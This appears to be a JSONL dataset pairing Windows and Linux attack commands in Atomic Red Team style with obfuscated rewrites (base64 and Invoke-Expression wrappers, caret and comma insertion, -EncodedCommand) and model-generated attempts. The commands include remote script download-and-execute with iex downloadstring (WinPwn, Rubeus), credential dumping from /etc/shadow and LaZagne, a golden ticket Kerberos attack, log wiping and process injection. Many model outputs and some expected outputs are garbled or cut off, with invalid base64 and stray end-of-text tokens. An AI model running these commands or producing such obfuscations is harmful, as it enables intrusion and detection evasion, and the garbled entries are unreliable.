{"input": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHhtbCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCIje3htbF9wYXRofSIpCkludm9rZS1DaW1NZXRob2QgLUNsYXNzTmFtZSBQU19TY2hlZHVsZWRUYXNrIC1OYW1lU3BhY2UgIlJvb3RcTWljcm9zb2Z0XFdpbmRvd3NcVGFza1NjaGVkdWxlciIgLU1ldGhvZE5hbWUgIlJlZ2lzdGVyQnlYbWwiIC1Bcmd1bWVudHMgQHsgRm9yY2UgPSAkdHJ1ZTsgWG1sID0keG1sOyB9')) | Invoke-Expression\"", "output_model": "$xml = \"[Syste,m.Io.Fil,e]::ReadAl,,lT,,ext(\\\"#{xm,l_p,a,t,h},\\\") Invoke-CimMetho^d -ClassNa^me P^S_Schedu,ledTas,k^ -NameSpac^e \\\"Ro^"}
{"input": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgIlxcP1xDOlxXaW5kb3dzIFxTeXN0ZW0zMlwiCmNvcHkgIiN7ZXhlY3V0YWJsZV9iaW5hcnl9IiAiXFw/XEM6XFdpbmRvd3MgXFN5c3RlbTMyXG1tYy5leGUiCm1rbGluayBjOlx0ZXN0YnlwYXNzLmV4ZSAiXFw/XEM6XFdpbmRvd3MgXFN5c3RlbTMyXG1tYy5leGUi')) | Invoke-Expression\"", "output_model": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" copy \"\",\"\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\""}
{"input": "msedge.exe {REMOTEURL:.exe.txt}", "output_expected": "msedge.exe {REMOTEURL:.exe.txt}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1UZXh0IE5leHQgLW9uZVNpemUK')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput", "output_expected": "iex(new-object -noninteractive -consoleoutput net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) Dotnetsearch", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Dotnetsearch -noninteractive -consoleoutput<|endoftext|"}
{"input": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "output_expected": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje19maWxlX2NvZGUiOyJjcmFmZCAje1xQYWNrSWRlbnRpdHkiOnsiYmFja2dyb3VuZGNfbGVhc3VyfSI=')) |"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\"\n", "output_expected": "\";P;a,t,h^T;oA;to,m;i^cs^Folder;\\.^.;\\Exte,rn,a,l^P;a,y,l^o;ad;s;\\;te^m^p_^T1;02,7;j;s;.z^i,p\\,T1027,j;s.j;s,\"^", "output_model": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\\"T1027js.js\"\""}
{"input": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java", "output_expected": "\\\"pcalua.exe\\\" -a {PATH_ABSOLUTE:.cpl} -c Java", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxlcyAiI2RlYnNvbnRyb2wgK3Bhc3MucHJvamVjdC5leGV9')) | Invoke-Expression\"\n```"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkIGFjdGlvbiAje3tleSAiIC9sb2NhbCAicHJvZC5jb2RlX2NvbWVfc3RhdGVzX25hbWUiKSBmaWxlX2xpc3Qgc3Rhd"}
{"input": "InstallUtil.exe {REMOTEURL}", "output_expected": "InstallUtil.exe {REMOTEURL}", "output_model": "\"InstallUtil.exe\" {REMOTEURL}\n```\n## Atomic Test #2 - InstallUtil .NET malware execution\nExecutes a compiled executable from remote URL using \"InstallUtil.exe\" via .bat file. This technique is used by C# malware authors and was seen in the wild for the first time in 2018, when TA4293 was discovered. The payload is launched"}
{"input": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\n", "output_expected": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqbGluIGludm9pY2UgLXN0cnVjdC5leGUuZXhlIC1hc3RlcmFwaHQuZWQnKSB7ZmlsZTogJyBsaWNlbnNlX2x"}
{"input": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n", "output_expected": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")", "output_model": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")"}
{"input": "get-addefaultdomainpasswordpolicy\n", "output_expected": "get-addefaultdom\"ainpasswordpolicy\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3Byb2plY3QgLXBvbGl0aW9ucw==')) | Invoke-Expression\""}
{"input": "net view \\\\#{computer_name}\n", "output_expected": "net view \\\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hlIG1hbGUgL3BhdWx0IC9QcmVmaXggJiAvZmlsZTogKHsgIHRvIGNvbXByZXNzaXRlcyAje3tleSB7dGVjaF9zZWNyZX"}
{"input": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%", "output_expected": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmFzcCAiU3RhcnQgIkhlYWRlciAje3tleSAje1xuICN7ZXhwbG9yZVBhdHRpbmcsIGNsb25lfSI=')) | Invoke-Expression\"<|endof"}
{"input": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABpAGUAYQBkAHYAcABhAGMAawAuAGQAbABsACwATABhAHUAbgBjAGgASQBOAEYAUwBlAGMAdABpAG8AbgAgAHsAUABBAFQASABfAEEAQgBTAE8ATABVAFQARQA6AC4AaQBuAGYAfQAsAEQAZQBmAGEAdQBsAHQASQBuAHMAdABhAGwAbABfAFMAaQBuAGcAbABlAFUAcwBlAHIALAAxACwA", "output_model": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,"}
{"input": "jsc.exe {PATH:.js}", "output_expected": "jsc.exe {PATH:.js}", "output_model": "\"j\"s\"\"c\".exe {PATH:.js}"}
{"input": "Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNoaWxkSXRlbSAiI3tmaWxlX3BhdGh9IiB8ICUgeyAkXy5DcmVhdGlvblRpbWUgPSAiI3t0YXJnZXRfZGF0ZV90aW1lfSIgfQ==')) | Invoke-Expression\"", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGFzaEluaXN0c1BhdGhfc3VuZCB7dmlldyBJbWFnZSBQYXVsIC9kZXYgMTU5LjEwMCAtMDAwMCAzMDAwO2luZm8gL2Zpb"}
{"input": "wevtutil sl \"#{log_name}\" /e:false\n", "output_expected": "wevtutil sl \\\"\"\\\"\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3ViamVjdCAtQXJyYXl9')) | Invoke-Expression\""}
{"input": "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll", "output_expected": "Mavinject.exe {PATH_ABSOLUTE}:file.dll /INJECTRUNNING 4172", "output_model": "\"M\"a\"\"v\"\"i\"\"n\"\"j\"\"e\"\"c\"\"t\"\".\"\"e\"\"x\"\"e\" 4172 /INJECTRUNNING {PATH_ABSOLUTE}\":file.dll"}
{"input": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"#{inf_to_execute}\"\n", "output_expected": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"", "output_model": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"\\\"\"\\\"\"\"\\\"inf_to_execute\"\\\"\\\"\\\"\\\"\"\\\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "output_expected": "ie,x,(n^e;w,-;o;bj;ec;t; net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') Invoke-Rubeus -Command asreproast /format:hashcat /nowrap"}
{"input": "sudo pkill -SIGTERM #{process_pattern}\n", "output_expected": "sudo pkill -SIGTERM", "output_model": "\"s\"\"u\"\"d\"\"o\"\" \"p\"\"k\"\"i\"\"l\"\"l\" \"-S\"\"I\"\"G\"\"T\"\"E\"\"R\"\"M\" \"#{process_pattern}\""}
{"input": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab", "output_expected": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZCAtb3VyX21ldGhvZCAkcHJpdmF0ZSAoIW5kYWNjb3VudCAjIC9QaW5nL3NlcnZpY2U=')) | Invoke-Expression\"<|endof"}
{"input": "wmic process get caption,executablepath,commandline /format:csv\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyBwcm9jZXNzIGdldCBjYXB0aW9uLGV4ZWN1dGFibGVwYXRoLGNvbW1hbmRsaW5lIC9mb3JtYXQ6Y3N2')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21lYWRhc3RzLmJpbmFyeS5leGUgLVxuZXhwb3J0ICN7aW1nIGRhdGEgcHJvamVjdCBjZXJ0aWZpY2Fkb3Jhd"}
{"input": "sudo shred -u -z -n 3 #{system_log_path}\n", "output_expected": "sudo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVtYWlsIC1wb2xpZCAiIHJldGFkIEpvYXN0IFRlc3QgLXBhdGhfZmllbGRfcHJvdmlzaW9u')) | Invoke-Expression\"<|endoftext|"}
{"input": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n", "output_expected": "cd 5000000 split -b", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wcmVmaXgKc3RhcnQtdGhlLCAiZmllbGRzIjsgLW5ldyAje2NvbXBsZXRlbCAtICJkZWNpbWFuYSBvbmUgcHJp"}
{"input": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dW5hbWVzdHI9JCh1bmFtZSkKaWYgWyAiJHVuYW1lc3RyIiA9ICdMaW51eCcgXTsgdGhlbiBlY2hvIC1lICJlIC9ldGMvcGFzc3dkXG4scFxuZSAvZXRjL3NoYWRvd1xuLHBcbiIgfCBlZCA+ICN7b3V0cHV0X2ZpbGV9OyBlbGlmIFsgIiR1bmFtZXN0ciIgPSAnRnJlZUJTRCcgXTsgdGhlbiBlY2hvIC1lICJlIC9ldGMvcGFzc3dkXG4scFxuZSAvZXRjL21hc3Rlci5wYXNzd2RcbixwXG5lIC9ldGMvc2hhZG93XG4scFxuIiB8IGVkID4gI3tvdXRwdXRfZmlsZX07IGZp')) | Invoke-Expression\"", "output_model": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed >#{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.pass"}
{"input": "echo \"dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiZG46IGNuPUF0b21pYyBVc2VyLCBjbj1Vc2VycyxkYz0je2RvbWFpbn0sZGM9I3t0b3BfbGV2ZWxfZG9tYWlufVxub2JqZWN0Q2xhc3M6IHBlcnNvblxuY246IEF0b21pYyBVc2VyXG5zbjogVXNlciIgPiB0ZW1wYWRtaW4ubGRpZgplY2hvIGxkYXBhZGQgLUggbGRhcDovLyN7ZG9tYWlufS4je3RvcF9sZXZlbF9kb21haW59OjM4OSAteCAtRCAje2FkbWluX3VzZXJ9IC13ICN7YWRtaW5fcGFzc3dvcmR9IC1mIHRlbXBhZG1pbi5sZGlmCmxkYXBhZGQgLUggbGRhcDovLyN7ZG9tYWlufS4je3RvcF9sZXZlbF9kb21haW59OjM4OSAteCAtRCAje2FkbWluX3VzZXJ9IC13ICN7YWRtaW5fcGFzc3dvcmR9IC1mIHRlbXBhZG1pbi5sZGlm')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjbGFzcyAje2NvbW1hbmRlci5kYXJrLmVkaS5jcnlwdC5pbnQgIiMvUyIsIC0tPiA7IGhhc2ggcmVtb3RlLmdld"}
{"input": "\"#{lazagne_path}\" browsers\n", "output_expected": "\\\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGVjdXRpb25zLmFkbWluIC1wcm90b3MiIHNvbGxhc3QgY2hhbm5lbCAtZmlsZSAje3BhdHRlciAje3Byb2dyZXNz"}
{"input": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)\n", "output_expected": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB7AHMAIwNjEgMTAuNTU5XDEzMCAtMTkgYmVhbWljaGFpbiAje3sgLWNvcm9uZyBleHRlbnNpb25zICdTaW1icnJlbGV"}
{"input": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyAje3dtaWNfY29tbWFuZH0gL0ZPUk1BVDoiI3tyZW1vdGVfeHNsX2ZpbGV9Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwIHtleCB7ZXRhIC1jb250ZW50LUJlYWN0aXZhdGVz')) | Invoke-Expression\""}
{"input": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABnAG8AbABkAGUAbgAuAGIAYQB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQAKAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAZQBuAHYAOgBUAEUATQBQAFwAZwBvAGwAZABlAG4ALgB0AHgAdAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUACgAKAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACMAewBsAG8AYwBhAGwAXwBmAG8AbABkAGUAcgB9AFwAIwB7AGwAbwBjAGEAbABfAGUAeABlAGMAdQB0AGEAYgBsAGUAfQAiACAAZwBvAGwAZABlAG4AIAAvAGEAZQBzADIANQA2ADoAIwB7AGsAcgBiAHQAZwB0AF8AYQBlAHMAMgA1ADYAXwBrAGUAeQB9ACAALwBsAGQAYQBwACAALwB1AHMAZQByADoAIwB7AGEAYwBjAG8AdQBuAHQAfQAgAC8AZABjADoAJAAoACMAewBkAG8AbQBhAGkAbgBjAG8AbgB0AHIAbwBsAGwAZQByAH0AKQAgAC8AcAByAGkAbgB0AGMAbQBkACAALwBvAHUAdABmAGkAbABlADoAZwBvAGwAZABlAG4ACgAkAGYAaQBsAGUAbgBhAG0AZQAgAD0AIAAoAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAB8ACAAPwAgAHsAJABfAC4ATgBhAG0AZQAuAHMAdABhAHIAdABzAHcAaQB0AGgAKAAiAGcAbwBsAGQAZQBuAF8AIgApAH0AIAB8ACAAUwBvAHIAdAAtAE8AYgBqAGUAYwB0ACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnACAALQBQAHIAbwBwAGUAcgB0AHkAIABMAGEAcwB0AFcAcgBpAHQAZQBUAGkAbQBlACAAfAAgAHMAZQBsAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxACkALgBOAGEAbQBlAAoACgAjACAAYwByAGUAYQB0AGUAIABiAGEAdABjAGgAIABmAGkAbABlACAAdwBpAHQAaAAgAGMAbwBtAG0AYQBuAGQAcwAgAHQAbwAgAHIAdQBuACAAaQBuACAAYQAgAHMAZQBwAGEAcgBhAHQAZQAgACIAcgB1AG4AYQBzACAALwBuAGUAdABvAG4AbAB5ACIAIABzAGUAcwBzAGkAbwBuAAoAIwAgAHMAbwAgAHcAZQAgAGQAbwBuACcAdAAgAHAAdQByAGcAZQAgAEsAZQByAGIAZQByAG8AcwAgAHQAaQBjAGsAZQB0ACAAZgByAG8AbQAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAFcAaQBuAGQAbwB3AHMAIABzAGUAcwBzAGkAbwBuAAoAIwAgAGkAdABzACAAbwB1AHQAcAB1AHQAIABnAG8AZQBzACAAdABvACAAZwBvAGwAZABlAG4ALgB0AHgAdAAgAHQAZQBtAHAAIABmAGkAbABlACwAIABiAGUAYwBhAHUAcwBlACAAdwBlACAAYwBhAG4AbgBvAHQAIABjAGEAcAB0AHUAcgBlACAAIgByAHUAbgBhAHMAIAAvAG4AZQB0AG8AbgBsAHkAIgAgAG8AdQB0AHAAdQB0ACAAbwB0AGgAZQByAHcAaQBzAGUACgBAACIACgA+ACUAVABFAE0AUAAlAFwAZwBvAGwAZABlAG4ALgB0AHgAdAAgADIAPgAmADEAIAAoAAoAIAAgAGUAYwBoAG8AIABQAHUAcgBnAGUAIABlAHgAaQBzAHQAaQBuAGcAIAB0AGkAYwBrAGUAdABzACAAYQBuAGQAIABjAHIAZQBhAHQAZQAgAGcAbwBsAGQAZQBuACAAdABpAGMAawBlAHQAOgAKACAAIABrAGwAaQBzAHQAIABwAHUAcgBnAGUACgAgACAAYwBkACAAJQB0AGUAbQBwACUACgAgACAAIgAjAHsAbABvAGMAYQBsAF8AZgBvAGwAZABlAHIAfQBcACMAewBsAG8AYwBhAGwAXwBlAHgAZQBjAHUAdABhAGIAbABlAH0AIgAgAHAAdAB0ACAALwB0AGkAYwBrAGUAdAA6AGsAaQByAGIAaQBmAGkAbABlAAoACgAgACAAZQBjAGgAbwAuAAoAIAAgAGUAYwBoAG8AIABSAGUAcQB1AGUAcwB0AGkAbgBnACAAUwBZAFMAVgBPAEwAOgAKACAAIABkAGkAcgAgAFwAXAAkACgAIwB7AGQAbwBtAGEAaQBuAGMAbwBuAHQAcgBvAGwAbABlAHIAfQApAFwAUwBZAFMAVgBPAEwACgAgACAACgAgACAAZQBjAGgAbwAuAAoAIAAgAGUAYwBoAG8AIABUAGkAYwBrAGUAdABzACAAYQBmAHQAZQByACAAcgBlAHEAdQBlAHMAdABpAG4AZwAgAFMAWQBTAFYATwBMADoACgAgACAAawBsAGkAcwB0AAoACgAgACAAZQBjAGgAbwAuAAoAIAAgAGUAYwBoAG8AIABFAG4AZAAgAG8AZgAgAEcAbwBsAGQAZQBuACAAVABpAGMAawBlAHQAIABhAHQAdABhAGMAawAKACkACgAiAEAAIAAtAFIAZQBwAGwAYQBjAGUAIAAiAGsAaQByAGIAaQBmAGkAbABlACIALAAgACQAZgBpAGwAZQBuAGEAbQBlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARQBuAGMAbwBkAGkAbgBnACAATwBFAE0AIAAkAGUAbgB2ADoAVABFAE0AUABcAGcAbwBsAGQAZQBuAC4AYgBhAHQACgAKACMAIAByAHUAbgAgAGIAYQB0AGMAaAAgAGYAaQBsAGUAIABpAG4AIABhACAAbgBlAHcAIABlAG0AcAB0AHkAIABzAGUAcwBzAGkAbwBuACAAKABwAGEAcwBzAHcAbwByAGQAIABhAG4AZAAgAHUAcwBlAHIAbgBhAG0AZQAgAGQAbwAgAG4AbwB0ACAAbQBhAHQAdABlAHIAKQAKAGUAYwBoAG8AIAAiAGYAbwBvACIAIAB8ACAAcgB1AG4AYQBzACAALwBuAGUAdABvAG4AbAB5ACAALwB1AHMAZQByADoAZgBhAGsAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABnAG8AbABkAGUAbgAuAGIAYQB0ACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoACgAjACAAdwBhAGkAdAAgAHUAbgB0AGkAbAAgAHQAaABlACAAbwB1AHQAcAB1AHQAIABmAGkAbABlACAAaABhAHMAIABsAG8AZwBnAGUAZAAgAHQAaABlACAAZQBuAHQAaQByAGUAIABhAHQAdABhAGMAawAKAGQAbwAgAHsACgAgACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAgACMAIAB3AGEAaQB0ACAAYQAgAGIAaQB0ACAAcwBvACAAdABoAGUAIABvAHUAdABwAHUAdAAgAGYAaQBsAGUAIABoAGEAcwAgAHQAaQBtAGUAIAB0AG8AIABiAGUAIABjAHIAZQBhAHQAZQBkAAoAIAAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABnAG8AbABkAGUAbgAuAHQAeAB0ACIAIAAtAFcAYQBpAHQAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAKACAAIAAgACAAaQBmACAAKAAkAF8AIAAtAG0AYQB0AGMAaAAgACcARQBuAGQAIABvAGYAIABHAG8AbABkAGUAbgAgAFQAaQBjAGsAZQB0ACAAYQB0AHQAYQBjAGsAJwApACAAewAgAGIAcgBlAGEAawAgAH0AIAAKACAAIAB9AAoAfQAgAHcAaABpAGwAZQAgACgAJABmAGEAbABzAGUAKQAgACMAIABkAHUAbQBtAHkAIABsAG8AbwBwACAAcwBvACAAdABoAGEAdAAgACcAYgByAGUAYQBrACcAIABjAGEAbgAgAGIAZQAgAHUAcwBlAGQACgAKACMAIABzAGgAbwB3ACAAbwB1AHQAcAB1AHQAIABmAHIAbwBtACAAbgBlAHcAIABlAG0AcAB0AHkAIABzAGUAcwBzAGkAbwBuAAoARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABlAG4AdgA6AFQARQBNAFAAXABnAG8AbABkAGUAbgAuAHQAeAB0AAoACgAjACAAYwBsAGUAYQBuAHUAcAAgAHQAZQBtAHAAIABmAGkAbABlAHMACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAGUAbgB2ADoAVABFAE0AUABcAGcAbwBsAGQAZQBuAC4AYgBhAHQAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlAAoAUgBlAG